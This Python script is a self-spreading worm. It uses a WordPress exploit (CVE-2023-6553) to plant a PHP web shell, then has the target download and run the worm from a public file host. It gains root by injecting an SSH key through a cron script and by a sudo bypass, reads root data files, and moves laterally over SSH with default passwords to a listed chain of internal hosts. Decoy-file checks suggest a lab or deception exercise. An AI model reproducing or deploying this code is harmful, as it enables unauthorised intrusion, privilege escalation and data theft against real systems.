import os
import sys
from subprocess import run
import requests
from netifaces import interfaces, ifaddresses, AF_INET
import paramiko 
from time import sleep
from scp import SCPClient # https://stackoverflow.com/questions/250283/how-to-scp-in-python

from wp_exploit.exploit import CVE_2023_6553

public_upload_url = "https://filebin.net/owtgopve6ii7ytuu"

# to build: pyinstaller -F --noconsole <python script>


def current_ip(): # https://stackoverflow.com/questions/270745/how-do-i-determine-all-of-my-ip-addresses-when-i-have-multiple-nics
    for interface in interfaces():
        for link in ifaddresses(interface)[AF_INET]:
            ip = link['addr']
            if ip != "127.0.0.1":
                return ip

def current_user():
    return run(["whoami"], capture_output=True).stdout.strip().decode('UTF-8')

def generate_ssh_keys(pub_file):
    private_key = paramiko.RSAKey.generate(bits=2048)

    public_key = private_key.get_base64()
    print(public_key)
    with open(pub_file, 'w') as f:
        f.write(f"ssh-rsa {public_key} hacker\n")
    print("pubkey written")

    return private_key

def public_upload(filename):
    with open(filename, 'rb') as file:
        files = {'file': file}
        response = requests.post(public_upload_url+filename, files=files)
        if 200 <= response.status_code <= 400:
            print(filename, 'posted successfully!')
        else:
            print(filename, "upload failed:", response.status_code, response.text)

def exploit_wordpress(ip):
    worm_file = "worm" # this is a copy of the currently running executable (created from this script with pyinstaller)
    public_upload(worm_file)

    cve_exploit = CVE_2023_6553("http://"+ip)
    if not cve_exploit.check_vulnerability():
        print("wordpress exploit failed vulnerability check")
        return False

    string_to_write = '<?php echo "[S]";echo `$_GET[0]`;echo "[E]";?>'
    if not cve_exploit.write_string_to_file(string_to_write):
        print("wordpress exploit failed to write shell")
        return False


    cmds = [f"rm {worm_file}",
            f"wget {public_upload_url+worm_file}",
            f"sed -i '1,3d' {worm_file}", # remove http data from top of executable
            f"chmod +x {worm_file}",
            f"./{worm_file}"]
    for cmd in cmds:
        print(cve_exploit.retrieve_command_output(cmd))

    delete_command = (
        f"<?php unlink('{cve_exploit.random_file_name}');?>"
    )
    cve_exploit.send_payload(
        cve_exploit.generate_php_filter_payload(delete_command)
    ) 

    return True

def exploit_crontab():
    """
    returns the location of a private key that can be used to SSH as root
    or False if unsuccessful
    """

    cron_file = "/var/spool/cron/crontabs/root"
    cron_script = "/var/backup.sh"
    pub_file = "/tmp/id_rsa.pub"
    private_key = False
    # try:
    with open(cron_file, "r") as f:
        if not cron_script in f.read():
            return False

    private_key = generate_ssh_keys(pub_file)

    with open(cron_script, "a") as f:
        f.write(f"\nsudo cat {pub_file} >> /root/.ssh/authorized_keys\n")

    # except:
        # return False
    
    print("Cron script modified - waiting 60 seconds for script to be executed")
    sleep(60)
    return private_key

def exploit_suid():
    """
    check for fake_suid; if there, run it; else, try find exploit
    returns True if true success or perceived success (deceived)/disuaded
    """

    fake_suid = "/usr/bin/script1"
    real_suid = "/usr/bin/find"

    if os.path.exists(fake_suid):
        run([fake_suid])
        return True

    # mode = os.stat(real_suid).st_mode
    # sticky_bit_set = bool(mode & stat.S_ISVTX)
    # if sticky_bit_set:
    #     # TODO: implement
    #     # os.system("find {???} -exec ??? \;") # cp file to .ssh/authorized_keys?
    #     return True

    return False

def exploit_sudo():
    return not os.system("echo password | sudo -S -u#-1 /bin/bash -c ./worm")

def exfil():
    """
    check for fake_data; if there, cat it; else, cat real data
    return true if we get the real data
    """

    fake_data = "/root/valuable_data.txt"
    real_data = "/root/important_data.txt"
    
    try:
        if os.path.exists(fake_data):
            os.system(f"cat {fake_data}")
            return False

        return not os.system(f"cat {real_data}")
    except:
        return False
        

def make_client(ip, user, password, priv_key):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    if password:
        client.connect(ip, username=user, password=password)
    else:
        client.connect(ip, username=user, pkey=priv_key)
    return client

def propagate(ip, user, password="", priv_key=None):
    client = make_client(ip, user, password, priv_key)
    scp = SCPClient(client.get_transport())
    scp.put("./worm")

    client = make_client(ip, user, password, priv_key) # TODO: maybe not necessary to make a new client...
    client.exec_command("chmod +x ./worm; ./worm")

def public_privesc():
    priv_key = exploit_crontab()
    if not priv_key:
        return False
    return propagate("localhost", "root", priv_key=priv_key)

def pivot(ip):
    exfil()
    propagate(ip, "user", password="password")

def main():
    foothold = "3.15.142.98"
    public1 = "10.0.15.134"
    db = "10.0.149.227"
    web = "10.0.139.86"
    pc1 = "10.0.137.70"
    pc2 = "10.0.132.76"
    pc3 = "10.0.128.190"

    exploit_wordpress(foothold)

    # attack_path = {
    #         public1:[
    #             lambda : exploit_suid() or public_privesc(),
    #             lambda : pivot(db),
    #             ],
    #         db:[
    #             lambda : exploit_suid() or exploit_sudo(),
    #             lambda : pivot(web),
    #             ],
    #         web:[
    #             lambda : exploit_suid() or exploit_sudo(),
    #             lambda : pivot(pc1),
    #             ],
    #         pc1:[
    #             lambda : exploit_suid() or exploit_sudo(),
    #             lambda : pivot(pc2),
    #             ],
    #         pc2:[
    #             lambda : exploit_suid() or exploit_sudo(),
    #             lambda : pivot(pc3),
    #             ],
    #         pc3:[
    #             lambda : exploit_suid() or exploit_sudo(),
    #             lambda : exfil() + exit(),
    #             ],
    #         }

    # # TODO: sleep for 30 sec between each stage
    # if "init" in sys.argv:
    #     exploit_wordpress(foothold)
    #     return

    # exploits = attack_path[current_ip()]
    # propagated = False
    # if current_user() != "root":
    #     propagated = exploits[0]()
    # if not propagated:
    #     exploits[1]()

main()
